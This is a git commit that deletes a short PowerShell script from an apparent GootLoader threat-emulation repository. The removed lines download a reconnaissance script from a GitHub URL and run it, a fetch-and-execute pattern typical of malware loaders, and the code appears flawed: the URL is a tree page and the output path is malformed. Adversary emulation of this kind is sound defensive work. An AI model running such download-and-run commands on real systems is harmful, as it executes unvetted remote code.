b56dfe3d310c70b560f35464f2ed7d86f961b028
AMIKA <60911813+AMIKA-pl@users.noreply.github.com>
2022-10-10 15:51:09 +0800

    Delete PowerShell Scripts directory

--- PowerShell Scripts/GetScripts.ps1
+++
@@ -1,4 +0,0 @@
-$url = 'https://github.com/AMIKA-pl/GootLoader-ThreatEmulation/tree/main/PowerShell%20Scripts/EPRecon.ps1'
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-Invoke-WebRequest -Uri $url -OutFile $env:C:\Documents\EPRecon.ps1 
-Powershell.exe .\EPRecon.ps1
